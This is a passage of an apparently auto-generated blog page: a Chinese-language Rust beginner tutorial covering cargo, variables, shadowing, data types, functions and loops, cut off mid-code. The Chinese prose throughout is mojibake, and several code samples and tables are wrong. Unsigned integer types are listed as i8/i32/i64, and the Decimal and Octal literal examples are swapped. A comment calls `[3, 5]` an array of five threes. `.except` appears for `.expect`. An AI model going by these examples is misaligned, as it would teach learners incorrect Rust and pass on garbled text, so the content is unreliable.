ä¸ºç¼–è¯‘å‡ºæ¥çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è¿è¡Œè¿™ä¸ªæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥ç¼–è¯‘å¹¶è¿è¡Œé¡¹ç›®ï¼Œæ›´åŠ æ–¹ä¾¿</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cargo run</span><br><span class="line">Â Â Compiling hello_cargo v0.1.0 (/home/humoooor/Code/RustPractice/hello_cargo)  </span><br><span class="line">Â Â Â Finished dev [unoptimized + debuginfo] target(s) <span class="keyword">in</span> 0.46s  </span><br><span class="line">Â Â Â Â Running `target/debug/hello_cargo`  </span><br><span class="line">Hello, world!</span><br></pre></td></tr></table></figure><p>ä¸‹é¢çš„å‘½ä»¤å¯ä»¥æ£€æŸ¥ä»£ç ç¡®ä¿å¯ä»¥ç¼–è¯‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cargo check</span><br><span class="line">Â Â Â Checking hello_cargo v0.1.0 (/home/humoooor/Code/RustPractice/hello_cargo)  </span><br><span class="line">Â Â Â Finished dev [unoptimized + debuginfo] target(s) <span class="keyword">in</span> 0.20s</span><br></pre></td></tr></table></figure><h3 id="å‘å¸ƒé¡¹ç›®"><a href="#å‘å¸ƒé¡¹ç›®" class="headerlink" title="å‘å¸ƒé¡¹ç›®"></a>å‘å¸ƒé¡¹ç›®</h3><p>åœ¨æ„å»ºæ—¶ä½¿ç”¨ <code>--release</code> å‚æ•°ï¼Œæ¥ä¼˜åŒ–ç¼–è¯‘é¡¹ç›®ï¼Œå¹¶åœ¨ <code>target/release</code> ç›®å½•ä¸‹ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¯ç”¨ä¼˜åŒ–ç¼–è¯‘æ—¶é—´æ›´é•¿ï¼Œä½†æ˜¯è¿è¡Œé€Ÿåº¦æ›´å¿«ï¼Œæ²¡æœ‰è°ƒè¯•ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cargo build --release</span><br><span class="line">Â Â Compiling hello_cargo v0.1.0 (/home/humoooor/Code/RustPractice/hello_cargo)  </span><br><span class="line">Â Â Â Finished release [optimized] target(s) <span class="keyword">in</span> 0.19s</span><br></pre></td></tr></table></figure><h2 id="å˜é‡å’Œå¯å˜æ€§"><a href="#å˜é‡å’Œå¯å˜æ€§" class="headerlink" title="å˜é‡å’Œå¯å˜æ€§"></a>å˜é‡å’Œå¯å˜æ€§</h2><h3 id="å˜é‡å®šä¹‰"><a href="#å˜é‡å®šä¹‰" class="headerlink" title="å˜é‡å®šä¹‰"></a>å˜é‡å®šä¹‰</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> [<span class="keyword">mut</span>] &#123;var_name&#125;: &#123;var_type&#125; = &#123;value&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">x</span> = <span class="string">&quot;-1&quot;</span>;</span><br><span class="line"><span class="comment">// å°† x ä» &quot;-1&quot; è½¬æ¢æˆ -1</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">x</span>: <span class="type">i32</span> = x.<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">except</span>(<span class="string">&quot;&quot;</span>); </span><br></pre></td></tr></table></figure><p>value_type å’Œ value å¿…é¡»å‡ºç°ä¸€ä¸ªï¼Œåœ¨æŸäº›æƒ…å†µï¼ˆå¦‚ç±»å‹è½¬æ¢ï¼‰ä¸‹ï¼Œä¸¤è€…éƒ½è¦å‡ºç°</p><p>æ¯æ¬¡åªå¯ä»¥å®šä¹‰ä¸€ä¸ªå˜é‡</p><h3 id="å¯å˜æ€§-mutable"><a href="#å¯å˜æ€§-mutable" class="headerlink" title="å¯å˜æ€§ mutable"></a>å¯å˜æ€§ mutable</h3><p>åœ¨ Rust ä¸­ï¼Œå˜é‡é»˜è®¤æ˜¯ä¸å¯æ”¹å˜çš„ï¼ˆimmutableï¼‰ï¼Œåœ¨å£°æ˜å˜é‡æ—¶åœ¨å˜é‡åå‰åŠ ä¸Š <code>mut</code> ä½¿å…¶å…·æœ‰å¯å˜æ€§</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;dd</span><br><span class="line">    <span class="comment">// x é»˜è®¤ä¸å¯å˜ï¼Œä¼šå‡ºç°ç¼–è¯‘é”™è¯¯</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="comment">// æ·»åŠ  mut åï¼Œå…è®¸ x çš„å€¼æ”¹å˜</span></span><br><span class="line">    <span class="comment">// let mut x = 5;</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;value of x: &#123;x&#125;&quot;</span>);</span><br><span class="line">    x = <span class="number">6</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;value of x: &#123;x&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å¸¸é‡-const"><a href="#å¸¸é‡-const" class="headerlink" title="å¸¸é‡ const"></a>å¸¸é‡ const</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;const_name&#125;: &#123;const_type&#125; = &#123;const_value&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PI: <span class="type">f32</span> = <span class="number">3.14</span>;</span><br></pre></td></tr></table></figure><p>å¿…é¡»æ³¨æ˜å¸¸é‡ç±»å‹</p><h3 id="éšè—"><a href="#éšè—" class="headerlink" title="éšè—"></a>éšè—</h3><p>ä¸€ä¸ªå˜é‡åå¯ä»¥é‡å¤å£°æ˜ï¼Œä¾¿äºåœ¨ç±»å‹è½¬æ¢ç­‰æƒ…å†µæ—¶å¤ç”¨å˜é‡åï¼Œå®é™…ä¸Šæ˜¯åˆ›å»ºäº†ä¸€ä¸ªæ–°å˜é‡ï¼Œä¹‹å‰çš„å˜é‡ä¼šè¢«éšè—ï¼Œç›´åˆ°æ–°å˜é‡çš„ä½œç”¨åŸŸç»“æŸ</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="string">&quot;-5&quot;</span>;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span>: <span class="type">i32</span> = x.<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Not a number&quot;</span>);</span><br><span class="line">        x = x + <span class="number">5</span>;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;x = &#123;x&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;x = &#123;x&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// output:</span></span><br><span class="line"><span class="comment">// x = 0</span></span><br><span class="line"><span class="comment">// x = -5</span></span><br></pre></td></tr></table></figure><h2 id="åŸºæœ¬æ•°æ®ç±»å‹"><a href="#åŸºæœ¬æ•°æ®ç±»å‹" class="headerlink" title="åŸºæœ¬æ•°æ®ç±»å‹"></a>åŸºæœ¬æ•°æ®ç±»å‹</h2><p>Rust æœ‰æ ‡é‡å’Œå¤åˆä¸¤ç±»æ•°æ®ç±»å‹</p><h3 id="æ ‡é‡ç±»å‹"><a href="#æ ‡é‡ç±»å‹" class="headerlink" title="æ ‡é‡ç±»å‹"></a>æ ‡é‡ç±»å‹</h3><h4 id="æ•´å‹-integer"><a href="#æ•´å‹-integer" class="headerlink" title="æ•´å‹ integer"></a>æ•´å‹ integer</h4><table><thead><tr><th>Len</th><th>signed</th><th>unsigned</th></tr></thead><tbody><tr><td>8-bit</td><td>i8</td><td>i8</td></tr><tr><td>32-bit</td><td>i32</td><td>i32</td></tr><tr><td>64-bit</td><td>i64</td><td>i64</td></tr><tr><td>128-bit</td><td>i128</td><td>i128</td></tr><tr><td>arch</td><td>isize</td><td>isize</td></tr><tr><td>Rust é»˜è®¤ç±»å‹ä¸º <code>i32</code></td><td></td><td></td></tr></tbody></table><p>arch ä¾èµ–è®¡ç®—æœºæ¶æ„ï¼Œ64 ä½æ¶æ„ <code>isize</code> å°±æ˜¯ 64 ä½</p><p>æ•°å­—å¯ä½¿ç”¨ <code>_</code> ä½œä¸ºåˆ†éš”ç¬¦ï¼Œæ–¹ä¾¿è¯»æ•°ï¼Œå¦‚ <code>1000</code> è¡¨ç¤ºä¸º <code>1_000</code> </p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ç±»å‹åç¼€æ¥æŒ‡å®šæ•°å­—ç±»å‹ï¼Œå¦‚ <code>57u8</code> ä¸ºæ— ç¬¦å· 8-bit æ•´å‹</p><table><thead><tr><th>å­—é¢å€¼</th><th>ä¾‹å­</th></tr></thead><tbody><tr><td>Hex</td><td>0xff</td></tr><tr><td>Decimal</td><td>0o77</td></tr><tr><td>Octal</td><td>99</td></tr><tr><td>Binary</td><td>0b11</td></tr><tr><td>Byte</td><td>bâ€™aâ€™</td></tr></tbody></table><h4 id="æµ®ç‚¹å‹-float"><a href="#æµ®ç‚¹å‹-float" class="headerlink" title="æµ®ç‚¹å‹ float"></a>æµ®ç‚¹å‹ float</h4><p>Rust æµ®ç‚¹æ•°ç±»å‹æœ‰ <code>f32</code> å’Œ <code>f64</code>ï¼Œé»˜è®¤ä¸º <code>f64</code> ç±»å‹ï¼Œç²¾åº¦æ›´é«˜</p><h4 id="å¸ƒå°”å‹-bool"><a href="#å¸ƒå°”å‹-bool" class="headerlink" title="å¸ƒå°”å‹ bool"></a>å¸ƒå°”å‹ bool</h4><p><code>true</code> å’Œ <code>false</code> ä¸¤ä¸ªå€¼</p><h4 id="å­—ç¬¦å‹-char"><a href="#å­—ç¬¦å‹-char" class="headerlink" title="å­—ç¬¦å‹ char"></a>å­—ç¬¦å‹ char</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">c</span> = <span class="string">&#x27;z&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">heart_eyed_cat</span>: <span class="type">char</span> = &#x27;ğŸ˜»&#x27;;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>char</code> å¤§å°æ˜¯å››ä¸ªå­—èŠ‚ï¼ŒUnicode ç¼–ç ï¼Œå¯ä»¥è¡¨ç¤ºæ¯” ASCII æ›´å¤šçš„å†…å®¹ï¼Œå¦‚ä¸­æ—¥éŸ©æ–‡ã€emoji ç­‰</p><p>å­—ç¬¦å‹çš„å€¼å¿…é¡»ä½¿ç”¨å•å¼•å·è¡¨ç¤ºï¼ŒåŒå¼•å·ä¸ºå­—ç¬¦ä¸²</p><h3 id="å¤åˆç±»å‹"><a href="#å¤åˆç±»å‹" class="headerlink" title="å¤åˆç±»å‹"></a>å¤åˆç±»å‹</h3><h4 id="å…ƒç»„-tuple"><a href="#å…ƒç»„-tuple" class="headerlink" title="å…ƒç»„ tuple"></a>å…ƒç»„ tuple</h4><p>å…ƒç»„å¯ä»¥å°†å¤šä¸ªç±»å‹çš„å€¼ç»„åˆè¿›ä¸€ä¸ªå¤åˆç±»å‹ï¼Œé•¿åº¦ä¸å¯å˜ï¼Œç±»ä¼¼ C è¯­è¨€çš„ç»“æ„ä½“</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">tup</span>: (<span class="type">i32</span>, <span class="type">f64</span>, <span class="type">u8</span>) = (<span class="number">500</span>, <span class="number">6.4</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>ç±»å‹å¯çœç•¥ï¼Œçœç•¥åä¸ºé»˜è®¤ç±»å‹</p><p>ä»å…ƒç»„ä¸Šå–å€¼</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">tup</span>: (<span class="type">i32</span>, <span class="type">f64</span>, <span class="type">u8</span>) = (<span class="number">500</span>, <span class="number">6.4</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è§£æ„ï¼Œdestructuring</span></span><br><span class="line"><span class="keyword">let</span> (x, y, z) = tup;</span><br><span class="line"><span class="comment">// ç´¢å¼•</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">x</span> = tup.<span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">y</span> = tup.<span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">z</span> = tup.<span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>ä¸å¸¦ä»»ä½•å€¼çš„å…ƒç»„ï¼Œç§°ä¸ºå•å…ƒå…ƒç»„</p><h4 id="æ•°ç»„-array"><a href="#æ•°ç»„-array" class="headerlink" title="æ•°ç»„ array"></a>æ•°ç»„ array</h4><p>æ•°ç»„çš„å…ƒç´ ç±»å‹å¿…é¡»ç›¸åŒï¼Œé•¿åº¦å›ºå®š</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ•°ç»„å£°æ˜</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">a</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="comment">// é•¿åº¦ä¸º 4ï¼Œå…ƒç´ ç±»å‹ä¸º i32 çš„æ•°ç»„</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">a</span>: [<span class="type">i32</span>; <span class="number">4</span>] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="comment">// é•¿åº¦ä¸º 5ï¼Œå…ƒç´ å…¨ä¸º 3 çš„æ•°ç»„</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">a</span> = [<span class="number">3</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ•°ç»„å…ƒç´ è®¿é—®</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">first</span> = a[<span class="number">0</span>];</span><br></pre></td></tr></table></figure><p>è¶Šç•Œè®¿é—®ä¼šç›´æ¥å¯¼è‡´ panicï¼Œè¿™æ˜¯ Rust çš„ä¸€ä¸ªå®‰å…¨æœºåˆ¶</p><h2 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h2><p>ä½¿ç”¨ <code>fn</code> å…³é”®å­—å£°æ˜å‡½æ•°ï¼Œå‡½æ•°åå’Œå˜é‡åä½¿ç”¨ <code>snake case</code> è§„èŒƒé£æ ¼ï¼Œå­—æ¯å…¨éƒ¨å°å†™</p><p>Rust ä¸åƒ C è¯­è¨€éœ€è¦åœ¨ è°ƒç”¨å‡½æ•° çš„å‰é¢å£°æ˜ è¢«è°ƒç”¨å‡½æ•°</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> &#123;func_name&#125; (&#123;var_name1&#125;: &#123;var_type1&#125;, ..) <span class="punctuation">-&gt;</span> &#123;ret_type&#125;&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;x&#125; + &#123;y&#125; = &#123;&#125;&quot;</span>, <span class="title function_ invoke__">my_func</span>(x, y));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">my_func</span>(x: <span class="type">i32</span>, y: <span class="type">i32</span>) <span class="punctuation">-&gt;</span> <span class="type">i32</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¿…é¡»æŒ‡å®šå‚æ•°ç±»å‹</p><h3 id="è¡¨è¾¾å¼å’Œè¯­å¥"><a href="#è¡¨è¾¾å¼å’Œè¯­å¥" class="headerlink" title="è¡¨è¾¾å¼å’Œè¯­å¥"></a>è¡¨è¾¾å¼å’Œè¯­å¥</h3><p>Rust æ˜¯<strong>åŸºäºè¡¨è¾¾å¼</strong>çš„è¯­è¨€</p><p>è¡¨è¾¾å¼ï¼šè®¡ç®—å¹¶äº§ç”Ÿä¸€ä¸ªå€¼ã€‚å¤§éƒ¨åˆ† Rust ä»£ç ç”±è¡¨è¾¾å¼ç»„æˆï¼Œæ•°å­¦è¿ç®—ã€å‡½æ•°è°ƒç”¨ã€å®è°ƒç”¨ã€å¤§æ‹¬å·åˆ›å»ºçš„å—ä½œç”¨äºéƒ½æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼</p><p>è¯­å¥ï¼šæ‰§è¡Œä¸€äº›æ“ä½œä½†ä¸è¿”å›å€¼çš„æŒ‡ä»¤ã€‚å½“è¡¨è¾¾å¼ç»“å°¾åŠ ä¸Šåˆ†å·æ—¶ï¼Œå®ƒå°±å˜æˆäº†è¯­å¥ã€‚å‡½æ•°å®šä¹‰ä¹Ÿæ˜¯ä¸€ä¸ªè¯­å¥</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">y</span> = &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">3</span>;</span><br><span class="line">    x + <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;y&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// output: </span></span><br><span class="line"><span class="comment">// 4</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ä»£ç å— <code>&#123;let x = 3; x + 1&#125;</code> ç”±äºç»“å°¾æ²¡æœ‰åˆ†å·ï¼Œæ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿”å›å€¼æ˜¯ 4</p><p>åœ¨æœ‰è¿”å›å€¼çš„å‡½æ•°ä¸­å¯ä»¥ä¸»åŠ¨ä½¿ç”¨ <code>return</code> è¿”å›å€¼ï¼Œä¹Ÿå¯ä»¥éšå¼åœ°è¿”å›å‡½æ•°ä¸­æœ€åçš„è¡¨è¾¾å¼</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">my_func</span>(x: <span class="type">i32</span>, y: <span class="type">i32</span>) <span class="punctuation">-&gt;</span> <span class="type">i32</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x + y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">my_func</span>(x: <span class="type">i32</span>, y: <span class="type">i32</span>) <span class="punctuation">-&gt;</span> <span class="type">i32</span> &#123;</span><br><span class="line">    x + y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿”å›è¡¨è¾¾å¼æ—¶ï¼Œç»“å°¾ä¸å¯åŠ åˆ†å·ï¼Œå¦åˆ™å®ƒå°±ä¸æ˜¯è¡¨è¾¾å¼äº†</p><h2 id="æ§åˆ¶æµ"><a href="#æ§åˆ¶æµ" class="headerlink" title="æ§åˆ¶æµ"></a>æ§åˆ¶æµ</h2><p>Rust ä¸­æ§åˆ¶æµçš„è¡¨è¾¾å¼å¿…é¡»è¿”å› bool ç±»å‹</p><h3 id="if-else"><a href="#if-else" class="headerlink" title="if-else"></a>if-else</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">number</span> = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> number % <span class="number">4</span> == <span class="number">0</span> &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;number is divisible by 4&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> number % <span class="number">3</span> == <span class="number">0</span> &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;number is divisible by 3&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> number % <span class="number">2</span> == <span class="number">0</span> &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;number is divisible by 2&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;number is not divisible by 4, 3, or 2&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ <code>let</code> è¯­å¥ä¸­ä½¿ç”¨ if-else</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">condition</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">number</span> = <span class="keyword">if</span> condition &#123; <span class="number">5</span> &#125; <span class="keyword">else</span> &#123; <span class="number">6</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;The value of number is: &#123;number&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// output:</span></span><br><span class="line"><span class="comment">// 5</span></span><br></pre></td></tr></table></figure><h3 id="loopã€whileã€for"><a href="#loopã€whileã€for" class="headerlink" title="loopã€whileã€for"></a>loopã€whileã€for</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ— é™å¾ªç¯</span></span><br><span class="line"><span class="keyword">loop</span> &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;again!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">a</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">i</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸¤ç§éå†æ•°ç»„çš„æ–¹å¼</span></span><br><span class="line"><span class="keyword">while</span> i &lt; a.<span class="title function_ invoke__">len</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;a[&#123;i&#125;] = &#123;&#125;&quot;</span>, a[i]);</span><br><span class="line">    i += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 0..a.len() ç›¸å½“äº Python çš„ range(0, len(a))</span></span><br><span class="line"><span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> <span class="number">0</span>..a.<span class="title function_ invoke__">len</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;a[&#123;i&#125;] = &#123;&#125;&quot;</span>, a[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>breakã€continue</strong></p><p>ç®€å•çš„ <code>break</code>ã€<code>continue</code> å¯ä»¥è·³å‡ºä¸€å±‚å¾ªç¯</p><p><code>break</code>ã€<code>continue</code> ååŠ ä¸Šè¡¨è¾¾å¼ï¼Œå¯ä»¥è¿”å›å€¼</p><p>æƒ³è¦è·³å‡ºåµŒå¥—å¾ªç¯ï¼Œåœ¨æŒ‡å®šå¾ªç¯å‰æ ‡è®°ä¸€ä¸ª<strong>å¾ªç¯æ ‡ç­¾</strong>ï¼Œä¸ <code>break</code> æˆ– <code>continue</code> ä¸€èµ·ä½¿ç”¨ï¼Œå¯ä»¥ä½œç”¨äºæ ‡è®°çš„å¾ªç¯ï¼Œ<code>å¾ªç¯æ ‡ç­¾</code>å‰éœ€è¦åŠ å•å¼•å· <code>&#39;</code></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">loop</span> &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;again!&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// res = 20</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">res</span> = <span class="keyword">loop</span> &#123;</span><br><span class="line">    counter += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> counter == <span class="number">10</span> &#123;</span><br><span class="line">        <span class="keyword">break</span> counter * <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åµŒå¥—å¾ªç¯</span></span><br><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">count</span> = <span class="number">0</span>;</span><br><span class="line"><span class="symbol">&#x27;counting_up</span>: <span class="keyword">loop</span> &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;count = &#123;count&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">remaining</span> = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;remaining = 